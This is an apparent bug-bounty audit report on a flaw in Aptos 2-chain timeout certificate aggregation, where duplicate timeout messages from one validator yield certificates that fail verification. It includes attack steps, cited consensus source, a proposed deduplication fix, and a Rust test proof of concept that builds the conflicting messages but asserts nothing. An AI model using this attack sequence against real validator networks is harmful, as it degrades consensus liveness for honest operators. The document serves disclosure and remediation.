# Audit Report

## Title
Malicious Validator Can Corrupt 2-Chain Timeout Certificate Aggregation via Multiple Timeout Messages with Different HQC Rounds

## Summary
A malicious validator can exploit a logic flaw in the 2-chain timeout certificate aggregation to create internally inconsistent timeout certificates. By sending multiple `RoundTimeout` messages with different `hqc_round` values, the attacker causes victim validators to store timeout certificates that fail verification when included in proposals, resulting in denial of service.

## Finding Description

The vulnerability exists in the consensus layer's timeout certificate aggregation logic. Unlike regular vote messages which have author-based deduplication, the `insert_round_timeout` method accepts multiple timeout messages from the same validator without any deduplication check. [1](#0-0) 

When processing these timeout votes, the `TwoChainTimeoutWithPartialSignatures::add` method updates `self.timeout` to the timeout with the highest `hqc_round`. [2](#0-1) 

However, the signature storage in `PartialSignaturesWithRound::add_signature` uses `or_insert` semantics, which preserves the first signature from each author and does not update it on subsequent calls. [3](#0-2) 

This creates an inconsistency where the TC's `timeout.hqc_round()` reflects the highest value received, but the stored signature for that validator corresponds to a lower `hqc_round` value signed in their first message.

**Attack Execution:**
1. A malicious validator sends a first `RoundTimeout` message with `hqc_round=5` 
2. Before quorum is reached, the same validator sends a second `RoundTimeout` message with `hqc_round=10`
3. The aggregation logic updates `self.timeout` to the timeout with `hqc_round=10`
4. But the validator's signature in storage remains associated with `hqc_round=5`
5. When quorum is reached, the malformed TC is stored without verification [4](#0-3)  and [5](#0-4) 

When the victim validator includes this TC in a proposal's `sync_info`, other nodes perform verification. [6](#0-5) 

The `TwoChainTimeoutCertificate::verify` method enforces that `timeout.hqc_round()` must equal the maximum of all signed rounds. This check fails because the TC's `hqc_round` is 10 but the maximum signed round in signatures is only 5. [7](#0-6) 

The proposal is rejected, preventing the victim validator from participating effectively in consensus.

## Impact Explanation

**Severity: High** (per Aptos Bug Bounty criteria)

This vulnerability enables **Validator Node Slowdowns**, a High severity impact category in the Aptos bug bounty program. The victim validator continuously produces proposals with invalid timeout certificates that are rejected by peers, causing:

1. **Consensus participation disruption**: The victim cannot successfully propose blocks while the malformed TC persists
2. **Liveness degradation**: If the victim is selected as leader for consecutive rounds, network block production is delayed
3. **Protocol violation**: The victim's consensus state contains a certificate that violates protocol invariants

Importantly, this does NOT cause consensus safety violations (no chain splits or double-spending) because the malformed TC fails verification at other validators, preventing acceptance of invalid state transitions. The attack is limited to availability impact, which correctly aligns with High (not Critical) severity.

## Likelihood Explanation

**Likelihood: High**

The attack is highly practical and executable:

1. **Low barrier to entry**: Requires only a single malicious validator, well within the < 1/3 Byzantine fault tolerance that AptosBFT is designed to handle
2. **Simple execution**: The attacker creates two valid `RoundTimeout` messages with different `hqc_round` values and sends them sequentially
3. **No coordination required**: No collusion with other validators needed
4. **Realistic timing window**: The attack succeeds whenever the second message arrives after the first but before quorum aggregation completes—a typical timing window in distributed consensus
5. **Repeatable**: Can be executed in every round to sustain the denial of service
6. **Cryptographically valid**: Each individual timeout message passes signature verification since the malicious validator legitimately signs different `(epoch, round, hqc_round)` tuples

## Recommendation

Implement author-based deduplication for `RoundTimeout` messages, similar to the existing deduplication for regular votes:

```rust
// In PendingVotes struct, add:
author_to_timeout: HashMap<Author, RoundTimeout>,

// In insert_round_timeout method, add deduplication check:
if let Some(previously_seen_timeout) = self.author_to_timeout.get(&round_timeout.author()) {
    if previously_seen_timeout.two_chain_timeout().hqc_round() 
        == round_timeout.two_chain_timeout().hqc_round() {
        return VoteReceptionResult::DuplicateVote;
    } else {
        // Same author, different hqc_round - equivocation
        error!(SecurityEvent::ConsensusEquivocatingTimeout, ...);
        return VoteReceptionResult::EquivocateVote;
    }
}
self.author_to_timeout.insert(round_timeout.author(), round_timeout.clone());
```

Alternatively, modify `PartialSignaturesWithRound::add_signature` to reject updates when the entry already exists, or verify the TC before storage in `insert_2chain_timeout_certificate`.

## Proof of Concept

```rust
// Test demonstrating the vulnerability
#[test]
fn test_timeout_aggregation_vulnerability() {
    let (signers, validator_verifier) = random_validator_verifier(4, None, false);
    let mut pending_votes = PendingVotes::new();
    
    // Create base timeout with hqc_round=5
    let timeout_low = TwoChainTimeout::new(1, 10, certificate_for_genesis_with_round(5));
    let timeout_high = TwoChainTimeout::new(1, 10, certificate_for_genesis_with_round(10));
    
    // Malicious validator A sends first message with hqc_round=5
    let mut timeout_msg_low = RoundTimeout::new(
        timeout_low.clone(),
        signers[0].author(),
        RoundTimeoutReason::Unknown,
        timeout_low.sign(&signers[0]).unwrap()
    );
    
    // Process first message
    pending_votes.insert_round_timeout(&timeout_msg_low, &validator_verifier);
    
    // Malicious validator A sends second message with hqc_round=10
    let timeout_msg_high = RoundTimeout::new(
        timeout_high.clone(),
        signers[0].author(), // Same author!
        RoundTimeoutReason::Unknown,
        timeout_high.sign(&signers[0]).unwrap()
    );
    
    // Process second message - NO DEDUPLICATION
    pending_votes.insert_round_timeout(&timeout_msg_high, &validator_verifier);
    
    // Add timeouts from other validators with hqc_round=5
    for signer in &signers[1..3] {
        let timeout = TwoChainTimeout::new(1, 10, certificate_for_genesis_with_round(5));
        let msg = RoundTimeout::new(
            timeout.clone(),
            signer.author(),
            RoundTimeoutReason::Unknown,
            timeout.sign(signer).unwrap()
        );
        pending_votes.insert_round_timeout(&msg, &validator_verifier);
    }
    
    // TC should now form but will be internally inconsistent:
    // - timeout.hqc_round() = 10 (from validator A's second message)
    // - A's signature corresponds to hqc_round = 5 (from validator A's first message)
    // This will fail verification with: "Inconsistent hqc round, qc has round 10, highest signed round 5"
}
```

## Notes

This vulnerability represents a logic flaw in the timeout aggregation mechanism rather than a cryptographic or implementation bug. The core issue is the asymmetry between how the timeout value and signatures are updated: the timeout is updated to the highest value seen, while signatures use insert-or-keep-existing semantics. This mismatch allows an attacker to create certificates that appear valid internally but fail external verification, causing denial of service against honest validators who store these malformed certificates.

### Citations

**File:** consensus/src/pending_votes.rs (L190-271)
```rust
    pub fn insert_round_timeout(
        &mut self,
        round_timeout: &RoundTimeout,
        validator_verifier: &ValidatorVerifier,
    ) -> VoteReceptionResult {
        //
        // Let's check if we can create a TC
        //

        let timeout = round_timeout.two_chain_timeout();
        let signature = round_timeout.signature();

        let validator_voting_power = validator_verifier
            .get_voting_power(&round_timeout.author())
            .unwrap_or(0);
        if validator_voting_power == 0 {
            warn!(
                "Received vote with no voting power, from {}",
                round_timeout.author()
            );
        }
        let cur_epoch = round_timeout.epoch();
        let cur_round = round_timeout.round();

        counters::CONSENSUS_CURRENT_ROUND_TIMEOUT_VOTED_POWER
            .with_label_values(&[&round_timeout.author().to_string()])
            .set(validator_voting_power as f64);
        counters::CONSENSUS_LAST_TIMEOUT_VOTE_EPOCH
            .with_label_values(&[&round_timeout.author().to_string()])
            .set(cur_epoch as i64);
        counters::CONSENSUS_LAST_TIMEOUT_VOTE_ROUND
            .with_label_values(&[&round_timeout.author().to_string()])
            .set(cur_round as i64);

        let two_chain_votes = self
            .maybe_2chain_timeout_votes
            .get_or_insert_with(|| TwoChainTimeoutVotes::new(timeout.clone()));
        two_chain_votes.add(
            round_timeout.author(),
            timeout.clone(),
            signature.clone(),
            round_timeout.reason().clone(),
        );

        let partial_tc = two_chain_votes.partial_2chain_tc_mut();
        let tc_voting_power =
            match validator_verifier.check_voting_power(partial_tc.signers(), true) {
                Ok(_) => {
                    return match partial_tc.aggregate_signatures(validator_verifier) {
                        Ok(tc_with_sig) => {
                            VoteReceptionResult::New2ChainTimeoutCertificate(Arc::new(tc_with_sig))
                        },
                        Err(e) => VoteReceptionResult::ErrorAggregatingTimeoutCertificate(e),
                    };
                },
                Err(VerifyError::TooLittleVotingPower { voting_power, .. }) => voting_power,
                Err(error) => {
                    error!(
                        "MUST_FIX: 2-chain timeout vote received could not be added: {}, vote: {}",
                        error, timeout
                    );
                    return VoteReceptionResult::ErrorAddingVote(error);
                },
            };

        // Echo timeout if receive f+1 timeout message.
        if !self.echo_timeout {
            let f_plus_one = validator_verifier.total_voting_power()
                - validator_verifier.quorum_voting_power()
                + 1;
            if tc_voting_power >= f_plus_one {
                self.echo_timeout = true;
                return VoteReceptionResult::EchoTimeout(tc_voting_power);
            }
        }

        //
        // No TC could be formed, return the TC's voting power
        //

        VoteReceptionResult::VoteAdded(tc_voting_power)
    }
```

**File:** consensus/consensus-types/src/timeout_2chain.rs (L176-181)
```rust
        ensure!(
            hqc_round == *signed_hqc,
            "Inconsistent hqc round, qc has round {}, highest signed round {}",
            hqc_round,
            *signed_hqc
        );
```

**File:** consensus/consensus-types/src/timeout_2chain.rs (L242-263)
```rust
    pub fn add(
        &mut self,
        author: Author,
        timeout: TwoChainTimeout,
        signature: bls12381::Signature,
    ) {
        debug_assert_eq!(
            self.timeout.epoch(),
            timeout.epoch(),
            "Timeout should have the same epoch as TimeoutCert"
        );
        debug_assert_eq!(
            self.timeout.round(),
            timeout.round(),
            "Timeout should have the same round as TimeoutCert"
        );
        let hqc_round = timeout.hqc_round();
        if timeout.hqc_round() > self.timeout.hqc_round() {
            self.timeout = timeout;
        }
        self.signatures.add_signature(author, hqc_round, signature);
    }
```

**File:** consensus/consensus-types/src/timeout_2chain.rs (L320-329)
```rust
    pub fn add_signature(
        &mut self,
        validator: AccountAddress,
        round: Round,
        signature: bls12381::Signature,
    ) {
        self.signatures
            .entry(validator)
            .or_insert((round, signature));
    }
```

**File:** consensus/src/round_manager.rs (L2005-2015)
```rust
    async fn new_2chain_tc_aggregated(
        &mut self,
        tc: Arc<TwoChainTimeoutCertificate>,
    ) -> anyhow::Result<()> {
        let result = self
            .block_store
            .insert_2chain_timeout_certificate(tc)
            .context("[RoundManager] Failed to process a newly aggregated 2-chain TC");
        self.process_certificates().await?;
        result
    }
```

**File:** consensus/src/block_storage/block_store.rs (L560-575)
```rust
    pub fn insert_2chain_timeout_certificate(
        &self,
        tc: Arc<TwoChainTimeoutCertificate>,
    ) -> anyhow::Result<()> {
        let cur_tc_round = self
            .highest_2chain_timeout_cert()
            .map_or(0, |tc| tc.round());
        if tc.round() <= cur_tc_round {
            return Ok(());
        }
        self.storage
            .save_highest_2chain_timeout_cert(tc.as_ref())
            .context("Timeout certificate insert failed when persisting to DB")?;
        self.inner.write().replace_2chain_timeout_cert(tc);
        Ok(())
    }
```

**File:** consensus/consensus-types/src/proposal_msg.rs (L113-115)
```rust
        if let Some(tc) = self.sync_info.highest_2chain_timeout_cert() {
            tc.verify(validator).map_err(|e| format_err!("{:?}", e))?;
        }
```
